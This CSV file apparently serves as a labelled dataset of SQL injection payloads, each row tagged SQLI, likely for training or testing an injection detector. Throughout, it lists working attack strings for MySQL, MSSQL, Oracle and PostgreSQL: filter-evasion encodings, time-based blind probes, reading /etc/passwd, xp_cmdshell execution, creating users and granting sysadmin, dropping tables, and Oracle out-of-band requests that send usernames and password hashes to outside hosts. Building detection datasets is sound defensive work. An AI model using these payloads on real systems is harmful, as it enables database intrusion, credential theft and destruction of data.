payload,attack
"b""'!=2!=3!=4# """,SQLI
"b""'|0# """,SQLI
"b""'&0# """,SQLI
"b""'^0# """,SQLI
"b""1'+and+@@servername>1--""",SQLI
"b""1'+and+@@version>1--""",SQLI
"b""1'+HAVING 1=1--""",SQLI
"b'(coalesce(length(load_file(0x2F6574632F706173737764)),1))'",SQLI
"b'if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00'",SQLI
"b'(1)rlike(if(mid(@@version,1,1)like(5),0x28,1))'",SQLI
"b'1),(version(),1,1'",SQLI
b'1%20union%20/*!select*/%20/*!@@datadir*/',SQLI
"b'15+/*!union*/+/*!all*/+/*!select*/+1,2,3,4,5,6,7--'",SQLI
"b'16+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--'",SQLI
"b""1'+and+(select+pass+from+users+limit+1)='pass--""",SQLI
b'123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1',SQLI
"b'union/*aaa*/select/*aaa*/1,2,3'",SQLI
"b'if(substring(USER(),1,4)=0x726f6f74,SLEEP(5),1)'",SQLI
b'10+UNION+SELECT+LOAD_FILE(0x2f6574632f706173737764)',SQLI
"b""1'&&1='1""",SQLI
"b""'='""",SQLI
"b""1'+and+(select+substr(group_concat(pass),1,1)+from+users)='a""",SQLI
"b'1%27%20union%20select%201,2,3--'",SQLI
"b'123%2527%2520select%2520convert(int,@@servername)--'",SQLI
b'%53E%4c%45%43T%20%73%63h%65%6d%61%6ea%6de%20%46%52O%4d%20%70g%5f%74a%62%6ce%73',SQLI
b'1++union++select++abc++from++abc',SQLI
b'1%20%20union%20%20select%20%20abc%20%20from%20%20abc',SQLI
b'1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc',SQLI
"b'1/*union*/union/*select*/select+1,2,3/*'",SQLI
"b'1%2520union%2520select%25201,2,3/*'",SQLI
"b'1%0Aunion%0Aselect%0A1,2,3/*'",SQLI
"b""1'OR'121'='121""",SQLI
"b""1'%0Cand%0C''='""",SQLI
"b""1'%0Cunion%0Cselect%0C1,2,3""",SQLI
"b""1'%0Band%0B''='""",SQLI
"b""1'%0Bunion%0Bselect%0B1,2,3""",SQLI
"b""1'%0Dand%0D''='""",SQLI
"b""1'%0Dunion%0Dselect%0D1,2,3""",SQLI
b'union(select(version()))',SQLI
b'123/*!or*/1=1;',SQLI
"b""1'union/*!select*/pass,load_file(0x11)from+users--""",SQLI
"b'1 and 9=8 /*!uNiOn*/ aLl /*!sElect*/ 1,2,3--'",SQLI
"b'1/**/union%a0select/**/1,pass,3`a`from`users`'",SQLI
"b'1+union+select+1,2,3/*'",SQLI
"b'1+union+select+1,2,3--'",SQLI
"b'1+union+select+1,2,3# '",SQLI
"b'1+union+select+1,2,3;%00'",SQLI
b'1+len(@@servername)>1/*',SQLI
b'1+len(@@servername)>1--',SQLI
b'1+len(@@servername)>1# ',SQLI
b'1+len(@@servername)>1;%00',SQLI
"b""'); exec sp_executesql('W'+'ait'+'for'+' '+'de'+'lay'+' '+'00:00:40');--""",SQLI
"b""'; EXEC ('SEL' + 'ECT US' + 'ER')""",SQLI
"b""'; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER'""",SQLI
"b""';declare @x varchar(80); set @x = 0x73656c65637420404076657273696f6e; EXEC (@x)""",SQLI
"b""';DECLARE+@S+NVARCHAR(200);SET+@S=CAST(0x73656c65637420404076657273696f6e+AS+NVARCHAR(200));EXEC(@S);""",SQLI
"b""1;declare+@myvar+nvarchar(80);set+@myvar=N'UNI'+N'ON%20SEL'+N'ECT%20U'+N'SER');EXEC(@myvar);""",SQLI
"b""SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;""",SQLI
"b""SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s;""",SQLI
"b""SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s;""",SQLI
b'123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23',SQLI
b'123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a6270793a%29%23',SQLI
b'123%EF%BC%87%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23',SQLI
b'123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23%00',SQLI
b'MTIzJyBMSU1JVCAxLDEgVU5JT04gQUxMIFNFTEVDVCBDT05DQVQoMHgzYTc1N2E3OTNhLElGTlVMTChDQVNUKHZlcnNpb24oKSBBUyBDSEFSKSwweDIwKSwweDNhNzM2YTc2M2EpIw==',SQLI
b'%27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23',SQLI
b'%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23',SQLI
b'123%27%23DDvIMgC%0ALIMIT%23wyQDiZxbEfWH%0A1%2C1%23vJHSbhW%0AUNION%23WfNzMdJBEP%0AALL%23AgDqJl%0ASELECT%23xRYClbEPoiuX%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28version%28%29%23BiJwsArZs%0AAS%23FgnwSFSQ%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23',SQLI
b'123%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619',SQLI
b'123%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194',SQLI
b'123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6864723a%2CIF%28ISNULL%28CAST%28version%28%29%20AS%20CHAR%29%29%2C0x20%2CCAST%28version%28%29%20AS%20CHAR%29%29%2C0x3a7767793a%29%23',SQLI
b'123%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473',SQLI
b'123%29%20%20%20%20AND%20%20%20%20%208558=8593%20%20AND%20%20%20%20%20%20%285473=5473',SQLI
b'123%27%20%20AND%20%20%20%28%20%20SELECT%20%20%20%202937%20%20%20FROM%28%20%20SELECT%20%20%20%20%20COUNT%28%2A%29%2C%20%20CONCAT%280x3a6d70663a%2C%28%20%20SELECT%20%20%20%20MID%28%28%20%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20%20%20CHAR%20%20%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a736e623a%2CFLOOR%28RAND%280%29%2A2%29%29x%20%20%20%20FROM%20%20%20%20INFORMATION_SCHEMA.CHARACTER_SETS%20%20%20%20GROUP%20%20%20%20%20BY%20%20%20%20x%29a%29%20%20AND%20%20%20%27rmHN%27=%27rmHN',SQLI
b'123%27%20%20%20%20LIMIT%20%20%201%2C1%20%20UNION%20%20%20%20%20ALL%20%20%20%20%20%20%20SELECT%20%20%20%20%20CONCAT%280x3a6d70663a%2C%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20CHAR%20%29%2C0x20%29%2C0x3a736e623a%29%23',SQLI
b'%1%2%3%%27%20%L%I%M%I%T%20%1%%2C%1%20%U%N%I%O%N%20%A%L%L%20%S%E%L%E%C%T%20%C%O%N%C%A%T%%28%0%x%3%a%6%d%7%0%6%6%3%a%%2C%I%F%N%U%L%L%%28%C%A%S%T%%28%d%a%t%a%b%a%s%e%%28%%29%20%A%S%20%C%H%A%R%%29%%2C%0%x%2%0%%29%%2C%0%x%3%a%7%3%6%e%6%2%3%a%%29%%23',SQLI
b'1%1%3%%27%+%A%N%D%+%1%=%1',SQLI
b'123%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20',SQLI
b'123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27',SQLI
b'123%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27',SQLI
b'123%27%23mPkKCjceC%0A%23pwsxOHFa%0ALIMIT%23GSTpANJXKGdC%0A%23uOaAVrPY%0A%23IufLHavTgnn%0A%23sRygbynG%0A1%2C1%23uRvizI%0A%23kNTIVAJnz%0AUNION%23IEVjNIbBGg%0A%23CrHaTy%0A%23PkPohIaUPUPP%0A%23ouAusiVKpxg%0A%23UTlHCuTls%0AALL%23ZdLRhsQPAkid%0A%23ObZxIruvjFbd%0A%23IxosRHsTC%0A%23lZlmVvV%0ASELECT%23FHaHzAMzvN%0A%23BWRjqHuR%0A%23BTtMGfzKairL%0A%23GvGSlRR%0A%23kbCsPv%0A%23kiirXiLzYG%0A%23RkKvrFrkKc%0ACONCAT%280x3a6267653a%2C%23TLxyzUYCN%0A%23iKDnXTOMyUX%0AIFNULL%28%23KLWKJH%0ACAST%28%23EVVXxVJ%0A%23ddeBcXdPJNK%0A%23JytbHTOvwXC%0Aversion%28%29%23OXQNXTG%0A%23JqAzVQn%0A%23uYcIYOA%0A%23xBATyw%0AAS%23SuQdAyf%0A%23hQHYtT%0A%23ReByaH%0A%23COkovdqzzcS%0A%23nJrotVbdX%0ACHAR%23NklnJgTSwC%0A%23StUlDCtwD%0A%23EHSUPhSgYLrO%0A%29%2C0x20%29%2C0x3a69626b3a%29%23%20and%20%270having%27=%270having%27',SQLI
b'123%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23',SQLI
b'123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23',SQLI
b'123%27%20%2F%2A%2130631LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a69626b3a%29%2A%2F%2',SQLI
b'123%29%20%2F%2A%2100000AND%203244=4853%20AND%20%286013=6013%2A%2F',SQLI
b'123%27%20%2F%2A%2100000LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a79757a3a%29%2A%2F%23',SQLI
b'123%27%2F%2A%21LIMIT%2A%2F1%2C1%2F%2A%21UNION%2A%2F%2F%2A%21ALL%2A%2F%2F%2A%21SELECT%2A%2F%2F%2A%21CONCAT%2A%2F%280x3a6a7a713a%2C%2F%2A%21IFNULL%2A%2F%28CAST%28%2F%2A%21database%2A%2F%28%29%2F%2A%21AS%2A%2F%2F%2A%21CHAR%2A%2F%29%2C0x20%29%2C0x3a79757a3a%29%23',SQLI
b'123%27%09LIMIT%0C1%2C1%0AUNION%04ALL%01SELECT%07CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%09AS%0BCHAR%29%2C0x20%29%2C0x3a79757a3a%29%23',SQLI
b'123%29%07AND%079869=8149%01AND%01%281045=1045',SQLI
b'1+and+1=1',SQLI
"b'1+and+100>(ASCII(Substring(user(),1,1)))'",SQLI
"b'1+and+100>(Select+top+1+ASCII(Substring(name,1,1))) from sysusers)--'",SQLI
"b'1 and 100>(Select ASCII(Substr(username,1,1))) from all_users where rownum<=1)'",SQLI
"b'1 and substring(version(),1,1)=4'",SQLI
b'1+order+by+19--',SQLI
"b""'1+and+'123'='123""",SQLI
"b""1'+or+@@servername=@@servername--""",SQLI
"b""1+and+ascii('a')=97""",SQLI
"b""1+and+hex('a')=61""",SQLI
"b""1+and+ord('a') = 97""",SQLI
b'1 and name=0x5265696E657273',SQLI
b'1+and+len(@@servername)>1--',SQLI
b'1+and+length(123)=3',SQLI
"b""123+AND+md5('a')!= md5('A')""",SQLI
b'and (select 1)=1',SQLI
"b""123'+not+like+'1234""",SQLI
"b""'aaa'<>'bbb'""",SQLI
"b""'+or+round(pi(),1)+true+true = version()""",SQLI
"b'+or+round(pi(),1)+true+true = version()'",SQLI
"b""'+where+(0)=0""",SQLI
b'+where 0 = 0',SQLI
"b'1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1))'",SQLI
"b'1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74'",SQLI
b'123%20or%20%c0%a7%c01%a71=%c0%a71',SQLI
b'123K29yKycxJz0nMQ==',SQLI
b'case when name=0x5265696E657273 then 1 else 0 end',SQLI
b'123+1+5-5-1',SQLI
b'123+len(1234)-len(123)',SQLI
b'23+len(@@servername)-len(@@servername)',SQLI
"b""')+waitfor+delay+'0:0:5'""",SQLI
"b""');waitfor+delay+'00:00:05'""",SQLI
"b""';waitfor+delay+'00:00:05'""",SQLI
"b""');waitfor+delay+'00:00:05'--""",SQLI
"b""');waitFor+Delay+'00:00:05'""",SQLI
"b""'waitfor+delay+'00:00:05'""",SQLI
"b""')+waitfor+delay+'00:00:05'""",SQLI
"b""'+waitfor+delay+'00:00:05'--""",SQLI
"b""'+waitfor+delay+'00:00:05'""",SQLI
"b""+waitfor+delay+'00:00:05'""",SQLI
"b""')+waitfor+time+'00:00:01'""",SQLI
"b""';waitfor+delay+'0:0:5'--""",SQLI
"b""';waitfor+delay+'0:0:5'--""",SQLI
"b'BENCHMARK(1000000000,MD5(CHAR(116)))'",SQLI
"b'IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)'",SQLI
"b""' UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1)""",SQLI
"b'+if(ASCII(SUBSTRING((\xc3\x82\xe2\x80\xa6),i, 1))>k,BENCHMARK(100000000, RAND()),1)'",SQLI
"b""'%20AND%20SLEEP(10)='""",SQLI
"b""'||UTL_HTTP.REQUEST('http://somehost/')||'""",SQLI
"b""'||utl_inaddr.get_host_name((select+user+from+dual))""",SQLI
"b""'+or+1=utl_http.request('http://host/'||(select+user+from+dual))--""",SQLI
sleep(__TIME__)#,SQLI
1 or sleep(__TIME__)#,SQLI
""" or sleep(__TIME__)#",SQLI
 or sleep(__TIME__)#,SQLI
""" or sleep(__TIME__)=""",SQLI
 or sleep(__TIME__)=',SQLI
1) or sleep(__TIME__)#,SQLI
""") or sleep(__TIME__)=""",SQLI
) or sleep(__TIME__)=',SQLI
1)) or sleep(__TIME__)#,SQLI
""")) or sleep(__TIME__)=""",SQLI
)) or sleep(__TIME__)=',SQLI
;waitfor delay '0:0:__TIME__'--,SQLI
);waitfor delay '0:0:__TIME__'--,SQLI
;waitfor delay '0:0:__TIME__'--,SQLI
""";waitfor delay '0:0:__TIME__'--",SQLI
);waitfor delay '0:0:__TIME__'--,SQLI
""");waitfor delay '0:0:__TIME__'--",SQLI
));waitfor delay '0:0:__TIME__'--,SQLI
));waitfor delay '0:0:__TIME__'--,SQLI
"""));waitfor delay '0:0:__TIME__'--",SQLI
"benchmark(10000000,MD5(1))#",SQLI
"1 or benchmark(10000000,MD5(1))#",SQLI
""" or benchmark(10000000,MD5(1))#",SQLI
" or benchmark(10000000,MD5(1))#",SQLI
"1) or benchmark(10000000,MD5(1))#",SQLI
""") or benchmark(10000000,MD5(1))#",SQLI
") or benchmark(10000000,MD5(1))#",SQLI
"1)) or benchmark(10000000,MD5(1))#",SQLI
""")) or benchmark(10000000,MD5(1))#",SQLI
")) or benchmark(10000000,MD5(1))#",SQLI
pg_sleep(__TIME__)--,SQLI
1 or pg_sleep(__TIME__)--,SQLI
""" or pg_sleep(__TIME__)--",SQLI
 or pg_sleep(__TIME__)--,SQLI
1) or pg_sleep(__TIME__)--,SQLI
""") or pg_sleep(__TIME__)--",SQLI
) or pg_sleep(__TIME__)--,SQLI
1)) or pg_sleep(__TIME__)--,SQLI
""")) or pg_sleep(__TIME__)--",SQLI
)) or pg_sleep(__TIME__)--,SQLI
; exec master..xp_cmdshell 'ping 10.10.1.2'--,SQLI
create user name identified by 'pass123' --,SQLI
create user name identified by pass123 temporary tablespace temp default tablespace users; ,SQLI
 ; drop table temp --,SQLI
"exec sp_addlogin 'name' , 'password' --",SQLI
" exec sp_addsrvrolemember 'name' , 'sysadmin' --",SQLI
" insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",SQLI
 grant connect to name; grant resource to name; --,SQLI
" insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",SQLI
 or 1=1 --,SQLI
 union (select @@version) --,SQLI
" union (select NULL, (select @@version)) --",SQLI
" union (select NULL, NULL, (select @@version)) --",SQLI
" union (select NULL, NULL, NULL,  (select @@version)) --",SQLI
" union (select NULL, NULL, NULL, NULL,  (select @@version)) --",SQLI
" union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",SQLI
"; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",SQLI
"; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",SQLI
"; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",SQLI
"; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",SQLI
; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,SQLI
; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ,SQLI
; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,SQLI
; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,SQLI
1 exec sp_ (or exec xp_),SQLI
1 and 1=1,SQLI
1' and 1=(select count(*) from tablenames); --,SQLI
1 or 1=1,SQLI
1' or '1'='1,SQLI
1or1=1,SQLI
1'or'1'='1,SQLI
fake@ema'or'il.nl'='il.nl,SQLI
1 and user_name() = 'dbo',SQLI
\'; desc users; --,SQLI
1\'1,SQLI
1' and non_existant_table = '1,SQLI
 or username is not NULL or username = ',SQLI
"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",SQLI
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",SQLI
1 uni/**/on select all from where,SQLI
 or ‘1’=’1,SQLI
 or '1'='1,SQLI
||utl_http.request('httP://192.168.1.1/')||',SQLI
" || myappadmin.adduser('admin', 'newpass') || '",SQLI
 AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",SQLI
